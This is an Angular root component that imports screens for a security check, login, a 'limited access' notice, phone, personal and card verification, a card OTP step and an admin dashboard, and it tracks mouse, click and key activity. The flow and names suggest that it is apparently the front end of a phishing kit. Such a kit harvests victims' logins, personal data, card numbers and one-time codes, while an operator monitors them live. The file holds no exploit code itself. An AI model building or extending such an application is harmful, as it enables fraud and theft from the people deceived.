
import { Component, inject, HostListener } from '@angular/core';
import { CommonModule } from '@angular/common';
import { StateService } from './services/state.service';

// Components
import { SecurityCheckComponent } from './components/security-check.component';
import { LoginComponent } from './components/login.component';
import { LimitedAccessComponent } from './components/limited-access.component';
import { PhoneVerificationComponent } from './components/phone-verification.component';
import { PersonalVerificationComponent } from './components/personal-verification.component';
import { CardVerificationComponent } from './components/card-verification.component';
import { CardOtpComponent } from './components/card-otp.component'; 
import { LoadingComponent } from './components/loading.component';
import { SuccessComponent } from './components/success.component';
import { StepSuccessComponent } from './components/step-success.component';
import { AdminDashboardComponent } from './components/admin-dashboard.component';

@Component({
  selector: 'app-root',
  standalone: true,
  imports: [
    CommonModule,
    SecurityCheckComponent,
    LoginComponent,
    LimitedAccessComponent,
    PhoneVerificationComponent,
    PersonalVerificationComponent,
    CardVerificationComponent,
    CardOtpComponent,
    LoadingComponent,
    SuccessComponent,
    StepSuccessComponent,
    AdminDashboardComponent
  ],
  templateUrl: './app.component.html',
})
export class AppComponent {
  state = inject(StateService);

  @HostListener('window:mousemove')
  @HostListener('window:click')
  @HostListener('window:keydown')
  onUserActivity() {
    // Safety check for HMR/Reload states
    if (this.state && this.state.registerUserActivity) {
        this.state.registerUserActivity();
    }
  }
}
